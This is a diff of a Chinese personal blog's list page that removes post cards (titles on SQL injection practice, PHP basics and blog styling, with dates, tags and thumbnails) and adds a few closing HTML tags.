-      <a href="/2020/04/06/%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E6%98%AF%E5%AD%97%E7%AC%A6%E5%9E%8B%E8%BF%98%E6%98%AF%E6%95%B4%E5%BD%A2%EF%BC%81%EF%BC%81%EF%BC%81/" class="post-title">
-        <h3>判断注入类型</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入<em>·</em></a>
-          
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/%E6%8A%80%E6%9C%AF/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2020/04/06/%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E6%98%AF%E5%AD%97%E7%AC%A6%E5%9E%8B%E8%BF%98%E6%98%AF%E6%95%B4%E5%BD%A2%EF%BC%81%EF%BC%81%EF%BC%81/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2020/04/03/php%E5%AD%A6%E4%B9%A0--%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%8F%8A%E5%8F%98%E9%87%8F%EF%BC%88%E4%B8%80%EF%BC%89/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://s1.ax1x.com/2020/07/31/alzwiF.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-4-3 15:04</div>
-      <a href="/2020/04/03/php%E5%AD%A6%E4%B9%A0--%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%8F%8A%E5%8F%98%E9%87%8F%EF%BC%88%E4%B8%80%EF%BC%89/" class="post-title">
-        <h3>php学习--基础知识及变量（一）</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-            <a href="/tags/php%E5%AD%A6%E4%B9%A0/">php学习<em>·</em></a>
-          
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/%E6%8A%80%E6%9C%AF/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2020/04/03/php%E5%AD%A6%E4%B9%A0--%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%8F%8A%E5%8F%98%E9%87%8F%EF%BC%88%E4%B8%80%EF%BC%89/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2020/03/05/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://s1.ax1x.com/2020/07/31/alzJrq.jpg">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-3-5 15:03</div>
-      <a href="/2020/03/05/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" class="post-title">
-        <h3>SQL注入--布尔盲注</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入<em>·</em></a>
-          
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/%E6%8A%80%E6%9C%AF/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2020/03/05/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2020/03/03/%E5%8D%9A%E5%AE%A2%E7%BE%8E%E5%8C%96%E4%B9%8B%E7%BD%91%E6%98%93%E4%BA%91%E7%94%9F%E6%88%90%E5%A4%96%E9%93%BE%EF%BC%88%E5%AF%B9%E4%BA%8E%E9%82%A3%E4%BA%9B%E5%9B%A0%E4%B8%BA%E7%89%88%E6%9D%83%E5%8E%9F%E5%9B%A0%E6%97%A0%E6%B3%95%E7%94%9F%E6%88%90%E5%A4%96%E9%93%BE%E7%9A%84%EF%BC%89/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(1).jpg.webp">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-3-3 15:03</div>
-      <a href="/2020/03/03/%E5%8D%9A%E5%AE%A2%E7%BE%8E%E5%8C%96%E4%B9%8B%E7%BD%91%E6%98%93%E4%BA%91%E7%94%9F%E6%88%90%E5%A4%96%E9%93%BE%EF%BC%88%E5%AF%B9%E4%BA%8E%E9%82%A3%E4%BA%9B%E5%9B%A0%E4%B8%BA%E7%89%88%E6%9D%83%E5%8E%9F%E5%9B%A0%E6%97%A0%E6%B3%95%E7%94%9F%E6%88%90%E5%A4%96%E9%93%BE%E7%9A%84%EF%BC%89/" class="post-title">
-        <h3>博客美化</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-            <a href="/tags/%E5%85%B6%E4%BB%96/">其他<em>·</em></a>
-          
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/%E6%8A%80%E6%9C%AF/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2020/03/03/%E5%8D%9A%E5%AE%A2%E7%BE%8E%E5%8C%96%E4%B9%8B%E7%BD%91%E6%98%93%E4%BA%91%E7%94%9F%E6%88%90%E5%A4%96%E9%93%BE%EF%BC%88%E5%AF%B9%E4%BA%8E%E9%82%A3%E4%BA%9B%E5%9B%A0%E4%B8%BA%E7%89%88%E6%9D%83%E5%8E%9F%E5%9B%A0%E6%97%A0%E6%B3%95%E7%94%9F%E6%88%90%E5%A4%96%E9%93%BE%E7%9A%84%EF%BC%89/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-    
-<article  class="post post-list-thumb post-list-thumb-left"  class="post post-list-thumb" itemscope="" itemtype="https://schema.org/BlogPosting">
-
-  <div class="post-thumb">
-    <a href="/2020/03/03/%E7%94%A8sql%20libs%20%E7%BB%83%E4%B9%A0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E2%80%94%EF%BC%89/">
-      <img class="lazyload" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(7).jpg.webp">
-    </a>
-  </div>
-  <div class="post-content-wrap">
-    <div class="post-content">
-      <div class="post-date">
-        <i class="iconfont icon-time">
-        </i>2020-3-3 15:03</div>
-      <a href="/2020/03/03/%E7%94%A8sql%20libs%20%E7%BB%83%E4%B9%A0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E2%80%94%EF%BC%89/" class="post-title">
-        <h3>sql注入练习</h3>
-      </a>
-      <div class="post-meta">
-        <span><i class="fa fa-tags"></i>
-        
-            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入<em>·</em></a>
-          
-        </span>
-        <span>
-          <i class="iconfont icon-file"></i>
-          
-            <a href="/categories/%E6%8A%80%E6%9C%AF/">技术</a>
-          
-        </span>
-      </div>
-      <div class="float-content">
-        <p></p>
-        <div class="post-bottom">
-          <a href="/2020/03/03/%E7%94%A8sql%20libs%20%E7%BB%83%E4%B9%A0sql%E6%B3%A8%E5%85%A5%EF%BC%88%E2%80%94%EF%BC%89/" class="button-normal">
-            <i class="iconfont icon-caidan"></i>
-          </a>
-        </div>
-      </div>
-    </div>
-  </div>
-</article>
-  
-
-
-    </main>
-      <!-- 首页默认取最最新文章集 -->
-    <!-- 
-      <nav class="navigator">
-        
-        <a class="extend prev" rel="prev" href="/page/2/">Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/">Next</a>
-      </nav>
-     -->
-  </div>
-  
-    <div id="pagination"><a href="/page/4/" class="">Previous</a></div>
-  
+        <hr>
+        <p><i class="iconfont icon-write"></i></p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
 </div>
+
+
 
     </div>    
     <div class="ins-search">
